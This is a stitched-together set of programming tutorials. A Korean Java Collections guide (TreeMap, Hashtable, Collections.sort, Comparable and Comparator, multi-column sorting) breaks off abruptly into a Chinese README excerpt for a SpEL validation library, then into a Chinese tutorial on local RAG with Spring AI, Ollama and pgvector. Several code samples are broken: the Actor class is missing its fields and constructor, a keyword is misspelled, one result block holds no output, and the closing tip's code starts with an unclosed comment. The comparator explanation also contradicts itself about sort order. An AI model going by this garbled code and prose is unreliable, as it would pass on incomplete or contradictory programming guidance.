| Object clone() | 현재 HashMap을 복제하여 반환. |
| boolean containsKey(Object key) | HashMap에 지정된 키(key)가 포함되어 있으면 true 리턴 |
| boolean containsValue(Object key) | HashMap에 지정된 값(value)가 포함되어 있으면 true 리턴 |
| Set entrySet() | HashMap에 저장된 키와 값을 엔트리(키와 값의 결합)의 형태로 Set에 저장하여 반환. |
| Object get(Object key) | 지정된 키(Key)의 값(객체)을 반환. |
| boolean isEmpty() | HashMap이 비어 있는지 확인. |
| Set keySet() | HashMap에 저장된 모든 키가 저장된 Set을 반환. |
| Object put(Object key, Object value) | HashMap에 키와 값을 저장. |
| void putAll(Map m) | Map에 해당하는 모든 요소를 HashMap에 저장. |
| Object remove(Object key) | HashMap에서 지정된 키로 저장된 값(객체)를 제거. |
| int size() | HashMap에 저장된 요소의 개수를 반환 |

## 5-3 TreeMap클래스

이진검색트리의 형태로 키와 값의 쌍으로 이루어진 데이터를 저장한다.

정렬된 순서로 키/값 쌍을 저장하므로 빠른 검색을 가능하게 한다는 장점이 있다.

해시맵과는 달리, 트리맵은 요소들이 키의 오름차순으로 저장 됩니다. 또한 저장시 정렬도 같이 하기 때문에 저장시간이 다소 오래 걸린다.

아까의 예제를 TreeMap으로 변형하여 작성해보도록 하자.

```java
/**
 * @author CodeVillains
 * @description : TreeMap 데모 
 */
package com.codevillains.collection;

import java.util.Iterator;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;

public class TreeMapDemo {

	public static void main(String args[]) {
		// 해시 맵을 만든다. 
		Map<String, Double> tm = new TreeMap<String, Double>();
		// 맵에 요소들을 넣는다. 
		tm.put(""홍길동이"", new Double(1240.34)); 
		tm.put(""김영순이"", new Double(223.39)); 
		tm.put(""퀵군"", new Double(1378.00)); 
		tm.put(""글라이더님"", new Double(9999.55)); 
		tm.put(""존 도"", new Double(-122.08));
		tm.put(""한효주님"", null);
		
		// 맵 엔트리의 컬렉션 집합을 가져온다. 
		Set<?> set = tm.entrySet();
		
		// 반복자를 얻는다. 
		Iterator<?> i = set.iterator();
		
		// 요소들을 출력한다. 
		while(i.hasNext()) {
			Map.Entry me = (Map.Entry)i.next();
			System.out.print(me.getKey() + "": "");
			System.out.println(me.getValue());
		} 
		
		// 존 도의 계좌에 1000을 예금한다. 
		double bonus = tm.get(""존 도"").doubleValue(); 
		tm.put(""존 도"", new Double(bonus + 1000)); 
		System.out.println(""존 도's new deposit: "" + tm.get(""존 도""));
		
	}
}
```

결과를 출력해보면 Key 의 오름차순으로 출력됨을 알수 있다.

```
글라이더님: 9999.55
김영순이: 223.39
존 도: -122.08
퀵군: 1378.0
한효주님: null
홍길동이: 1240.34
존 도's new deposit: 877.92
```

## 5-4 LinkedHashMap 클래스



LinkedHashMap은 기본적으로 HashMap을 상속받았기 때문에 HashMap과 매우 흡사합니다. 차이점은 Map에 있는 엔트리들의 연결 리스트를 유지한다는 점이다. 즉, Map에 저장된 삽입-순서로 반복하는것을 가능하게 해준다.

똑같은 예제를 LinkedHashMap 타입으로 변경하여 테스트 해보자.

입력받은 순서대로 출력됨을 확인 할 수 있다.

## 5-5 Hashtable 클래스

HashMap보다는 느리지만 동기화가 지원된다. HashMap 과는 다르게 null 값은 허용하지 않습니다.

HashMap 에 동기화 블럭을 통해 코딩한 경우(Collections.synchronizedMap(new HashMap(...))) 보다는 속도가 빠르다고 알려져 있다.

아래의 예제를 실행해보도록 하자.

```java
/**
 * @author CodeVillains
 * @description : Hashtable 데모 
 */ 
package com.codevillains.collection;


import java.util.Enumeration;
import java.util.Hashtable;

public class HashTableDemo {

	public static void main(String args[]) {
		// Create a hash map
		Hashtable<String, Double> ht = new Hashtable<String, Double>();
		Enumeration<String> names;
		String str;

		ht.put(""홍길동이"", new Double(1240.34));
		ht.put(""김영순이"", new Double(223.39));
		ht.put(""퀵군"", new Double(1378.00));
		ht.put(""글라이더님"", new Double(9999.55));
		ht.put(""존 도"", new Double(-122.08));
		ht.put(""한효주님"",  new Double(55.77));

		names = ht.keys();
		while (names.hasMoreElements()) {
			str = (String) names.nextElement();
			System.out.println(str + "": "" + ht.get(str));
		}
		System.out.println();

		double bonus = ((Double) ht.get(""존 도"")).doubleValue();
		ht.put(""존 도"", new Double(bonus + 1000)); 
		System.out.println(""존 도's new deposit: "" + ht.get(""존 도""));
	}
}
```

실행결과 살펴보면 아래와 같다.

```
글라이더님: 9999.55
퀵군: 1378.0
한효주님: 55.77
존 도: -122.08
김영순이: 223.39
홍길동이: 1240.34

존 도's new deposit: 877.92
```

| 특징 | HashMap | Hashtable |
| --- | --- | --- |
| 객체 생성 방법 | Map map = new HashMap(); | Map hashtable = new Hashtable(); |
| 주요 특징 | 단일스레드 환경에서 사용하기 좋은 자료구조 | 멀티스레드 환경에서 사용하기 좋은 자료구조 (synchronized 가 붙어있다.)
thread-safe 하지만 hashmap 보다 느리다. |

# 6. Collection의 활용 예제

Collection을 통해 자주 쓰는 메서드를 활용하여 예제를 만들어보았다. 결과가 어떻게 나오는지 살펴보자.

```java
package com.codevillains.collection;
/**
 * @author CodeVillains
 */
import java.util.*;

public class AlgorithmsDemo {

	public static void main(String args[]) {

		// 링크드 리스트를 만들고 초기화한다.
		LinkedList<Integer> ll = new LinkedList<Integer>();
		ll.add(new Integer(-8));
		ll.add(new Integer(20));
		ll.add(new Integer(-20));
		ll.add(new Integer(8));

		// 역순의 비교자를 생성.
		Comparator<Integer> r = Collections.reverseOrder();

		// 비교자를 사용해서 리스트를 정렬한다.
		Collections.sort(ll, r);

		// 반복자를 얻는다.
		Iterator<Integer> li = ll.iterator();

		System.out.print(""List sorted in reverse: "");
		while (li.hasNext()) {
			System.out.print(li.next() + "" "");
		}

		System.out.println();

		Collections.shuffle(ll);

		// 임의의 리스트를 표시한다.
		li = ll.iterator();
		System.out.print(""List shuffled: "");

		while (li.hasNext()) {
			System.out.print(li.next() + "" "");
		}
		System.out.println();

		System.out.println(""Minimum: "" + Collections.min(ll));
		System.out.println(""Maximum: "" + Collections.max(ll));

	}
}
```

Collections 클래스에는 정렬이나 순서 조합을 위한 다양한 메서드들을 지원합니다.

| 메서드 | 설명 |
| --- | --- |
| Collections.copy(list, list) | 컬렉션 요소들을 복사한다. |
| Collections.reverse(list) | list 요소의 순서를 반대로 변경한다. |
| Collections.reverseOrder() | list 요소의 순서를 역순으로 정렬힌다. |
| Collections.shuffle(list) | list 순서를 변경힌다.(Shuffle) |
| Collections.sort(list) | list 를 정렬힌다. |
| Collections.min(list) | list 의 요소중 가장 작은값을 반환한다. |
| Collections.max(list) | list 의 요소중 가장 큰 값을 반환한다. |

다음 강좌에서 정렬에 대해서는 다시 예제로 설명할 예정이다.

실행 결과는 shuffle 에 따라 다소 다르겠지만 아래와 같다.

```
List sorted in reverse: 20 8 -8 -20 
List shuffled: -8 8 20 -20 
Minimum: -20
Maximum: 20
```

자료구조의 구분이나 컬렉션의 계층도, 맵 계열의 계층도를 통해 좀 더 상속이나 구현관계를 이해할 수 있어야 하며, 내부 활용 메서드들은 빈번하게 사용되므로 꼭 한번쯤 정리 해보기를 바란다.

# 7. Collection 을 이용한 데이터의 정렬

개발을 하다보면 다양한 요구사항에 직면하게 된다. 비단 고객사의 요구사항에 맞춰 개발하는 SI에 국한된것이 아니라 제품을 만들때 화면 레벨에서 Ajax 와 같은 Asyc 처리시에 URL 호출 후 내려 받은 데이터들을 DB를 억세스 하지 않고 정렬 알고리즘을 적용해야 하는 상황이 온다면 Collection Framework 을 이용하여 충분히 해결할 수 도 있다.

## 7-1 정렬



정렬 (Sort) - 배열 되어 있는 자료들을 큰 순서, 작은 순서로 재 배열 하는 것을 말한다. 일반적인 알고리즘에서 기본적으로 알아야 할 개념들은 아래와 같다.

- 선택 정렬 (Selection Sort) : 주어진 리스트에서 최소값을 찾아 맨 앞에 위치값과 비교하여 교체한다. 목록의 각 위치에 대해서 이러한 과정을 계속한다.

  `O(n^2) 의 퍼포먼스가 나온다.`

- 버블 정렬 (Bubble Sort) : 구성 요소를 순회하면서 인접한 두개의 원소를 비교하여 자리를 교환하는 방식으로 반복하며 정렬을 완성한다. 뒤에 값이 작으면 앞으로 위치를 바꿔줘야 해서 가변공간이 하나 필요하다.

  `퍼포먼스가 비효율적이다. 최악의 경우 역순으로 정렬하려고 할 때 O(n^2)가 나오고 최선은 리스트가 이미 정렬이 되어있을 경우 O(N)의 성능이 나온다.`

- 퀵 정렬 (Quick Sort) : 따로 메모리를 사용하지 않는다. 현재 있는 메모리 안에서 정렬하기 때문에 효율이 좋다.

  기준값을 중심으로 완족 부분 집합과 오른쪽 부분 집합으로 분할 한 후 왼쪽엔 작은값을, 오른쪽엔 기준값 보다 큰 값을 이동시킨다. 이런 방식을 순환적으로 반복하여(각각 quick sort로 리컬시브하게 연산) 정렬을 완성한다.

  `퍼포먼스는 O(n log n), worst case O(n^2) : 이미 정렬된 상태에서 실행할 경우`

- 삽입 정렬 (Insertion Sort) : 삽입 정렬, 배열의 모든 요소를 앞에서부터 차례대로 이미 정렬된 배열 부분과 비교하여, 자신의 위치를 찾아 삽입함.

  대상을 기준값의 왼쪽 요소부터 비교해서 기준값의 크기가 비교값보다 작을 경우 두개의 위치를 바꿔주고 기준값을 저장한다. (반복하면서 정렬)

  `O(n^2) 의 퍼포먼스가 나온다.`

- 병합 정렬 (Merge Sort) : (Divide & Conquer) : 안정적인 정렬

  주워진 배열을 두 부분씩 나누워 정렬한 후 하나로 합치는 방식

  두 번의 재귀 호출과 한 번의 합병으로 구성되며 재귀 호출 시 배열 크기가 절반으로 줄어 들어 깊이가 log n 으로 된다.

  즉, 두 배열의 합은 두 배열의 크기의 합에 비례 함으로 전체 수행 시간 복잡도는 최악, 최선, 평균 모두 O(n log n).

  분할정복 방식의 알고리즘의 한 종류 (1/2 씩 분할)

  `퍼포먼스는 O(n log n)`


위와 같은 알고리즘의 전형적인 정렬 방식과는 별개로, 실무를 하다보면 View 페이지 혹은 로직 내부에서 오름차순, 내림차순과 같은 정렬을 구현해야 할 때가 있다. 필자의 경우 실무에서 가나다, ABC, 123의 순서대로 출력해달라는 요구도 받아본 적이 있다. (이 부분에 대한 처리는 이번 챕터 제일 뒤에 나온다.)

이러한 업무 요구사항은 위의 정렬 알고리즘과는 별개로 굉장히 흔하고 대부분의 기능들은 라이브러리 형태를 추가하거나 따로 구현을 해주어야 한다.

자바에서는 정렬을 구현할때 가장 먼저 알아두어야할 Interface가 있는데 바로 Comparable 과 Comparator 인터페이스이다.

- Comparable 인터페이스는 java.lang.lang에 존재한다.
  - int compareTo(T o) 메서드를 오버라이드 해서 내부에서 순서를 정렬
- Comparator 인터페이스는 java.util.Comparator 패키지에 존재한다.
  - int compare(T o1, T o2) 메서드를 구현하여 두 객체간의 크기를 비교하여 정렬 



물론 위의 인터페이스를 사용하지 않고도 손쉽게 sort 를 수행하는 라이브러리나 TreeMap, TreeSet 과 같은 자료형을 이용하여 내부정렬을 할 수도 있겠다.

## 7-2 Collections.sort()를 이용한 정렬


```java
/**
 * @author CodeVillains
 * @description : Collections.sort()를 이용한 정렬 데모 
 */
package com.codevillains.collection.sort;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class ListSort {

    public static void main(String args[]) {
        List<String> listObject = new ArrayList<String>();
        listObject.add(""z"");
        listObject.add(""a"");
        listObject.add(""f"");
        listObject.add(""c"");

        System.out.println(""##기본출력 : "" + listObject);
        // 문자열순으로 정렬
        Collections.sort(listObject, String.CASE_INSENSITIVE_ORDER);

        System.out.println(""##순차정렬 : "" + listObject);
        // 역순으로 정렬
        Collections.sort(listObject, Collections.reverseOrder());
        System.out.println(""##역순정렬 : "" + listObject);
    }
}
```

Collections.sort(listObject, String.CASE_INSENSITIVE_ORDER); 를 이용해서 순차정렬을, Collections.reverseOrder()를 이용해서 역순정렬을 시도 하였다.

출력결과는 아래와 같다.

```
##기본출력 : [z, a, f, c]
##순차정렬 : [a, c, f, z]
##역순정렬 : [z, f, c, a]
```

문자열의 정렬일 경우 따로 Interface를 Implements 하지 않아도 자동으로 된다. 이에 대한 설명은 아래 예제를 한번 더 살펴본후에 하겠다.

## 7-3 Arrays.sort() 를 이용한 정렬

아래는 Array 형태의 데이터를 정렬하는 예제이다.

```java
/**
 * @author CodeVillains
 * @description : Array.sort()를 이용한 정렬 데모 
 */
package com.codevillains.collection.sort;

import java.util.Arrays;

public class ArraySort {
	public static void main(String[] args) {

		String[] s = { ""b"", ""A"", ""D"", ""C"", ""a"", ""F"" };

		// 대소문자 구분하여 정렬
		Arrays.sort(s);
		System.out.println(""# 대소문자 구분"");
		System.out.println(Arrays.toString(s));

		descArraySort(s);
		System.out.println(""# 역정렬 "");
		System.out.println(Arrays.toString(s));

		// 대소문자 구분 없이 정렬
		System.out.println(""# 대소문자 구분없이 "");
		Arrays.sort(s, String.CASE_INSENSITIVE_ORDER);
		System.out.println(Arrays.toString(s));

	}

	public static void descArraySort(String[] arr) {
		String temp;

		for (int i = 0; i < arr.length / 2; i++) {
			temp = arr[i];
			arr[i] = arr[(arr.length - 1) - i];
			arr[(arr.length - 1) - i] = temp;
		}
	}
}
```

결과는 아래와 같다.

```
# 대소문자 구분
[A, C, D, F, a, b]
# 역정렬 
[b, a, F, D, C, A]
# 대소문자 구분없이 
[a, A, b, C, D, F]
```

Array.sort 를 이용하여 문자열을 정렬하였다. 단순히 대소문자를 구분하여 정렬하고, 다시 역정렬 메소드를 구현하여 출력한 후 대소문자 구분 없이 (String.CASE_INSENSITIVE_ORDER) 출력하였다.

Sort 를 통해 순차적으로 정렬이 되는 이유는 당연하겠지만 자바의 String 클래스가 Comparable 인터페이스를 구현하고 따라서 알파벳 순서로 정렬하도록 compareTo 메서드가 구현되어 있기 때문이다.

그렇다면 문자열이 아닌 객체의 정렬을 어떻게 처리해야 할까?

이를테면 게시판에서 게시물의 순서(BoardType 이라는 Object에 존재하는 게시물 순번 이라던가) 유저명 혹은 ID 같은 프러퍼티 기준으로 할 경우에는 어떻게 할 것인가?

이 때에는 (String에서 자동으로 동작하는 Comparable 인터페이스처럼) 객체에서 Comparable 을 implements 하여 compareTo 메서드를 구현해야 한다.

게시물로 정렬하는 예라고 생각하고 아래를 코드를 살펴보자.

```java
//현재 넘어온 매개변수와 Board 변수의 title을 비교하여 정렬한다. 
public int compareTo(Object o){ 
    reutrn title.compareTo(((Board)o).title); 
}
```

당연히 이 Board라는 객체에 Comparable 인터페이스를 implements 해줘야 하므로 compareTo를 구현하게 되는데 이때 어떤 기준으로 정렬을 할 것인가에 따라 매개변수와 비교대상 변수를 리턴해주면 된다.

compareTo 로 넘어오는 매개변수가 현재 변수보다 앞에 존재한다면 음수를, 같다면 0을, 뒤에 존재한다면 양수를 리턴 한다.

이렇게 구현한 후 해당 객체의 배열로 정렬해야 할 경우 Arrays.sort(arr) 를, 리스트로 정렬해야 할 경우 Collections.sort(list)로 해버리면 정렬이 처리 된다.

## 7-4 Comparable 과 Comparator를 통한 정렬 구현



먼저 지난 10년간의 청룡영화제 남우 주연상 수상자를 뽑아와 배우이름이나 수상연도 기준으로 정렬하는 예제를 살펴보도록 하겠다.

아래는 배우 수상 정보를 담고 있는 Actor 클래스이다.

```java
/**
 * @author CodeVillains
 * @description : Comparable을 이용한 정렬 데모 
 */

class Actor implements Comparable<Object> {

		this.name = name;
		this.title = title;

	public String toString() {
		return ""수상 배우 목록 {"" + ""배우 = "" + name + "", 영화 제목 ["" + title + ""]"" + "", 청룡영화제 남우주연상 수상 연도="" + prizeYear + '}';
	}

	// 정렬될 때 배우 이름 기준으로 오름차순 정렬한다.
	@Override
	public int compareTo(Object o) {
		return name.compareTo(((Actor) o).name);
	}
}
```

배우명, 영화제목, 수상연도를 출력하기 위해 인스턴스 변수를 선언하였고 toString으로 출력한다.

**`Comparable`** 인터페이스는 객체들 간의 순서를 정의할 수 있도록 하는데 사용된다. 이 인터페이스를 구현함으로써, 해당 클래스의 인스턴스들을 정렬하거나 이진 검색 등을 수행하는 등의 작업을 더 쉽게 할 수 있다.

위 코드에서 Actor 클래스가 Comparable 인터페이스를 구현한 이유는, 해당 클래스의 인스턴스들을 이름(name)을 기준으로 정렬하고자 하기 위함이며, Comparable 인터페이스를 구현하면 **`compareTo`** 메서드를 오버라이드하여 두 객체를 비교할 때 사용하는 규칙을 정의할 수 있다. 위 코드에서 compareTo 메서드는 name 필드를 기준으로 두 Actor 객체를 비교하도록 정의되어 있다.

기본정렬, 수상 연도 정렬, 이름정렬 등으로 테스트를 해보고 Array와 List, TreeSet 등의 자료형으로 정렬 처리를 테스트 한 후 결과를 확인해 보자.

코드는 아래와 같다.

수상 연도를 정렬하기 위해 prizeYearComparator를 별도로 만들었다.

```java
/**
 * @author CodeVillains
 * @description : Comparator 정렬  데모 
 */
package com.codevillains.collection.sort.actor;

import java.util.Comparator;

// 수상 연도별로 정렬하기 위해 Comparator 인터페이스를 구현
class prizeYearComparator implements Comparator<Object> {
	public int compare(Object o1, Object o2) {
		int year1 = ((Actor) o1).prizeYear;
		int year2 = ((Actor) o2).prizeYear;
		return year1 > year2 ? -1 : (year1 == year2 ? 0 : 1); 
	}
}
```

prizeYearComparator 클래스는 Actor 클래스의 prizeYear 필드를 기준으로 객체를 내림차순으로 정렬한다. compare 메소드에서는 두 개의 객체를 인자로 받아서, prizeYear 필드를 비교하여 정렬한다.

비교 결과에 따라서, 양수, 0, 음수를 리턴하는데, year1이 year2보다 크다면 -1을 리턴하여 오름차순으로 정렬하며, year1과 year2가 같다면 0을 리턴한다. year1이 year2보다 작다면 1을 리턴하여 내림차순으로 정렬한다.

처리 결과는 아래와 같다.

```java

Sorting을 위한 Comparable 인터페이스를 구현하기 위해 Actor 클래스에 compareTo를 Overriding 했고 나머지 정렬조건을 위해 Comparator를 이용한 정렬을 이용 하였다.

Comparator 인터페이스는 compare 를 구현해서 compareTo와 같은 방식으로 리턴해주면 정렬이 수행된다.

소스상의 주석으로 자세한 설명을 해두었기 때문에 실행 결과를 확인해보면 어렵지 않게 정렬 구현에 대해서 이해할 수 있을것이라 생각된다.

다음은 자료형에 따른 심플한 데이터 정렬 예제를 살펴겠다.

```java
/**
 * @author CodeVillains
 * @description : Comparator 인터페이스를 통한 정렬 구현  
 */
package com.codevillains.collection.sort;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.Arrays;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public class TestMap {

	private static final Logger logger = LoggerFactory.getLogger(TestMap.class);

	public static void main(String[] args) {
		Map<String, String> addr = new HashMap<String, String>();
		addr.put(""가가가1"", ""1"");
		addr.put(""나나나2"", ""1"");
		addr.put(""가가가1"", ""1"");
		addr.put(""다다다0"", ""1"");

		logger.info(""#Map 에 담긴 자료 : {}"", addr);

		Set<String> set = addr.keySet();
		Object[] hmKeys = set.toArray();
		Arrays.sort(hmKeys, nameSorter); // 이름순 정렬하기

		for (int i = 0; i < hmKeys.length; i++) {
			String key = (String) hmKeys[i];
			logger.info(""# key = {}"", key);
		}
	}

	public static Comparator<Object> nameSorter = (s1, s2) -> {
		String ss1 = (String) s1;
		String ss2 = (String) s2;
		return (-1) * ss2.compareTo(ss1);
	};

}
```

키의 네임순으로 정렬하기 위해 nameSorter를 통해 Comparator의 compareTo를 적용하였다.

결과화면을 확인해보면 아래와 같다.

```java
INFO  TestMap:24 - # Map 에 담긴 자료 : {나나나2=1, 다다다0=1, 가가가1=1}
INFO  TestMap:32 - # key = 가가가1
INFO  TestMap:32 - # key = 나나나2
INFO  TestMap:32 - # key = 다다다0
```

이처럼 map으로 key정보 정렬해서 가져오는것도 어렵지 않게 활용할 수 있다.

## 7-5 Multi Column 에 대한 정렬 처리

특정 기준에 의한 Sort는 Collection.sort 를 쓰든, Comparable 인터페이스를 구현하는 방식이든 비교적 간단하게 사용할 수 있다.

두 컬럼 이상의 기준을 가지고 정렬 해야 할 경우(예를 들어, 상품 순번을 기준으로 옵션 사이즈 별로 출력해야 한다거나) 어떻게 처리하는지 예제를 통해서 확인해보도록 한다.

```java
/**
 * @author CodeVillains
 */
package com.codevillains.collection.sort;

public class Product {

	public Product(String prdId, Integer prdSize) {
		this.prdId = prdId;
		this.prdSize = prdSize;
	}
	
	private String prdId;
	private Integer prdSize;
	
	public String getPrdId() {
		return prdId;
	}
	public void setPrdId(String prdId) {
		this.prdId = prdId;
	}
	public Integer getPrdSize() {
		return prdSize;
	}
	public void setPrdSize(Integer prdSize) {
		this.prdSize = prdSize;
	}	
}
```

간단하게 상품의 코드와 상품 사이즈를 선언하였다.

저장된 데이터중 상품별, 상품의 사이즈 순으로 출력하기 위해서는 org.apache.commons.collections.comparator (아파치 commons-collections 사용) 를 이용하여 multi 컬럼에 대한 ComparatorChain 을 설정하면 된다.

아래는 실제 상품의 코드 기준으로 사이즈 순 정렬을 구현한 코드이다.

```java
/**
 * @author CodeVillains
 * @description : 상품의 코드 기준으로 사이즈 별 정렬  
 */
package com.codevillains.collection.sort;

import org.apache.commons.collections4.comparators.ComparatorChain;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class ComplexSort {

	private static final Logger logger = LoggerFactory.getLogger(ComplexSort.class);
	private static List<Product> products = new ArrayList<>();
	
	public static void main(String args[]) {
		prepareData();
		
		ComparatorChain chain = new ComparatorChain();
		//비교할 대상을 각 Comparator로 작성
		chain.addComparator(comparatorPrdId);	// 상품아이디 정렬 
		chain.addComparator(comparatorPrdSize);	// 상품사이즈 정렬 
		
		Collections.sort(products, chain);
		
		consoleLog();
	}

	/**
	 * 상품 아이디를 정렬한다. 
	 */
	public static Comparator<Product> comparatorPrdId = (o1, o2) -> 
																o1.getPrdId().compareToIgnoreCase(o2.getPrdId());

	/**
	 * 상품의 사이즈를 정렬한다. 
	 */
	public static Comparator<Product> comparatorPrdSize = Comparator.comparing(Product::getPrdSize);

	/**
	 * 대상 객체의 출력 기능 
	 */
	private static void consoleLog() {
		logger.info(""########## 출력 시작 #########"");
		for (Product product : products) {
			logger.info(""Print : {} = {}"", product.getPrdId(), product.getPrdSize());
		}
	}

	/**
	 * 미리 데이터를 생성함 
	 */
	private static void prepareData() {
		products.add(new Product(""tshirt"", 110));
		products.add(new Product(""tshirt"", 90));
		products.add(new Product(""tshirt"", 100));
		products.add(new Product(""tshirt"", 95));
		products.add(new Product(""tshirt"", 105));
		
		products.add(new Product(""shoes"", 270));
		products.add(new Product(""shoes"", 260));
		products.add(new Product(""shoes"", 275));
		
		products.add(new Product(""clothes"", 44));
		products.add(new Product(""clothes"", 55));
		products.add(new Product(""clothes"", 66));
	}
}
```

ArrayList 타입의 Product 는 DB에서 꺼내온 것으라고 가정한다. 실제 데이터는 prepareData 메서드에서 준비해놓고 각 항목(상품명, 상품의 사이즈) 의 기준별로 오름차순으로 정렬을 하는 방식이다.

prepareData()를 통해 데이터를 미리 셋팅한 후 ComparatorChain의 addComparator에 Comparator 할 대상 컬럼을 지정해준다.

ComparatorChain은 아파치 commons의 collections4 라이브러리에 존재한다. 따라서 build.gradle에 아래와 같이 추가해주어야 한다.

```java
implementation group: 'org.apache.commons', name: 'commons-collections4', version: '4.0'
```

현재 소스에서는 상품명과 상품명에 해당하는 각 사이즈들을 정렬하기 위해서 compare를 오버라이딩한 prdId 와 prdSize를 비교하도록 하였다.

그 역할은 comparatorPrdId 와 comparatorPrdSize를 통해서 구현되어 있다.

람다 표기형태로 되어있지만 해당 코드를 Compare 메서드로 Override 해서 구현해 본다면 아래와 같다.

```java
public static Comparator<Product> comparatorPrdId = new Comparator<Product>() {
		@Override
		public int compare(Product o1, Product o2) {
			return o1.getPrdId().compareToIgnoreCase(o2.getPrdId());
		}
};

public static Comparator<Product> comparatorPrdSize = new Comparator<Product>() {
		@Override
		public int compare(Product o1, Product o2) {
			return o1.getPrdSize().compareTo(o2.getPrdSize());
		}
};
```

compareTo를 비교하여 값을 리턴하는것은 앞서서 이미 설명을 하였다.

최종적으로 Collections.sort(list, chain);을 통해 대상 자료를 정렬한 후 결과를 출력하였다.

```java
########## 출력 시작 #########
Print : clothes = 44
Print : clothes = 55
Print : clothes = 66
Print : shoes = 260
Print : shoes = 270
Print : shoes = 275
Print : tshirt = 90
Print : tshirt = 95
Print : tshirt = 100
Print : tshirt = 105
Print : tshirt = 110
```

각 항목기준으로 (상품명) 사이즈 순서대로 정상적인 정렬이 완료된것을 확인 할 수 있다.

전체 예제 소스는 아래의 Git의 collections Repository에서 확인 할 수 있다.

# *Tip. 한글, 영문, 숫자순으로 정렬*


과거 업무 진행중에 정렬 조건이 한글순, 영문순, 숫자순 (가나다, abc, 123)으로 정렬을 하여 페이징을 해달라는 요구를 받은 적이 있다.

각각을 발라내서 정렬한 후 머지하고 페이징을 하거나 비교함수를 통해 각 캐릭터의 정렬 로직을 만들거나 해야 할 것으로 판단했는데 다행히 이미 깃허브에 구현한 로직이 있어서 참고할 수 있었다.

```java
/**

private void sortByName(List<Partner> results) {
        // 가나다 abc 123 순으로 정렬
        Collections.sort(results, new Comparator<Partner>() {
            @Override
            public int compare(Partner left, Partner right) {
                return OrderingByKoreanEnglishNumbuerSpecial.compare(left.getName(), right.getName());
            }
        });
    }
```

## 交流群

请添加微信号 `sticki6`，备注 `SpEL`，我拉你入群。

## 它解决了什么问题？

- 枚举值字段校验：
  ```java
  @SpelAssert(assertTrue = "" T(cn.sticki.enums.UserStatusEnum).getByCode(#this.userStatus) != null "", message = ""用户状态不合法"")
  private Integer userStatus;
  ```

- 多字段联合校验：
  ```java
  @NotNull
  private Integer contentType;
  
  @SpelNotNull(condition = ""#this.contentType == 1"", message = ""语音内容不能为空"")
  private Object audioContent;
  
  @SpelNotNull(condition = ""#this.contentType == 2"", message = ""视频内容不能为空"")
  private Object videoContent;
  ```

- 复杂逻辑校验，调用静态方法：
  ```java
  // 中文算两个字符，英文算一个字符，要求总长度不超过 10
  // 调用外部静态方法进行校验
  @SpelAssert(assertTrue = ""T(cn.sticki.util.StringUtil).getLength(#this.userName) <= 10"", message = ""用户名长度不能超过10"")
  private String userName;
  ```

- 调用 Spring Bean（需要使用 @EnableSpelValidatorBeanRegistrar 开启Spring Bean支持）：
  ```java
  // 这里只是简单举例，实际开发中不建议这样判断用户是否存在
  @SpelAssert(assertTrue = ""@userService.getById(#this.userId) != null"", message = ""用户不存在"")
  private Long userId;
  ```

- 更多使用场景，欢迎探索和补充！

# Spring AI+Ollama+pgvector实现本地RAG

## 前言

之前写过一篇[Spring AI+Ollama本地环境搭建](https://www.bxmdm.com/archives/2024030801)的文章，本篇在此基础上进一步搭建本地RAG。RAG是目前大模型应用落地的一套解决方案，中文名叫检索增强，由于大语言模型有时效性和幻觉等局限性，使用RAG方案，先利用搜索技术从本地知识中搜索出想要的相关信息，在将相关信息组成prompt中上下文的一部分，在由大模型根据prompt进行回复。本次就构建一个demo，使用RAG技术构建一个文档问答的应用。如图所示，RAG文档问答的整体流程大致分成两个阶段：

1、数据准备，将待文本数据通过embedding模型转成文本向量，并存储到向量数据库中。

2、用户提问，将用户提出的文本通过embedding模型转成问题文本向量，并在向量库中进行搜索，搜索得到一些文本段落，将搜索到的文本段落组装成prompt去调用大模型来获得答案。

```mermaid
graph LR  
    
    user[User] --> question[问题]
    doc[文本数据] --> embedding[Embedding Model]  
    embedding --> docVector[文本向量]
    docVector --> VectorDatabase[向量数据库]
    question[问题] --> embedding[Embedding Model] 
    embedding[Embedding Model]  --> questionVector[问题向量]
    questionVector[问题向量] --> VectorDatabase[向量数据库]
    VectorDatabase[向量数据库] --> docParagraph[文本段落]
    docParagraph[文本段落] --> prompt[提示词]
    prompt[提示词] --> llm[大模型]
    llm[大模型] --> answer[答案]
    answer[答案] --> user[User]
    
    style doc fill:#98FB98;
    style docVector fill:#98FB98;
    style user fill:#FF8C00;
    style question fill:#FF8C00;
    style questionVector fill:#FF8C00;
    style docParagraph fill:#FF8C00;
    style prompt fill:#FF8C00;
    style answer fill:#FF8C00;
```

本次demo中，整体流程的业务逻辑都通过spring ai来实现，spring ai支持调用Ollama来实现chat和embedding，支持pgvector来作为向量数据存储和搜索，所以选择的模型和数据库信息如下：

模型运行工具：Ollama

embedding模型： mofanke/dmeta-embedding-zh（中文支持比较好）

大模型：qwen:7b（中文支持比较好）

向量数据库：pgvector（postgresql）



**工程完整代码:**

https://github.com/jianyuan1991/ragdemo

https://gitee.com/jianyuan/ragdemo

## 环境准备

### Ollama和模型

Ollama本地部署

下载qwen:7b:

```powershell
ollama run qwen:7b
```

*Ollama部署和qwen模型下载可以参考[Spring AI+Ollama本地环境搭建](https://www.bxmdm.com/archives/2024030801)*



下载embedding模型:

```powershell
ollama pull  mofanke/dmeta-embedding-zh
```

![安装dmeta-embedding-zh完成](./img/安装dmeta-embedding-zh完成.png)



### pgvector

pgvector是postgresql的一个扩展，使得postgresql能够存储和搜索向量数据，pgvector 提供 2 种类型的索引，IVFFlat 和 HNSW，都是近似最近邻 （ANN） 索引，索引可以加快搜索相似向量的速度。以下是它们的主要区别：

![IVFFlat和HNSW的区别](./img/IVFFlat和HNSW区别.png)

另外pgvector 引入了三个可用于计算相似度的新运算符： <-> – 欧几里得距离、<#> – 负内积、<=> – 余弦距离

本次demo采用docker安装pgvector:

```
docker run --name pgvector \
    -e POSTGRES_PASSWORD=postgres \
    -p 5432:5432 \
	-d pgvector/pgvector:pg16
```



## 业务实现

### 数据准备

本次demo文本数据读取txt文件，spring ai中实现了TextReader用于读取txt文件，部分源码如下，比较简单，没有对文本内容进行解析（文本内容的解析在RAG中很重要，直接影像RAG中文本信息的搜索效果）。

```java
String document = StreamUtils.copyToString(this.resource.getInputStream(), this.charset);

// Inject source information as a metadata.
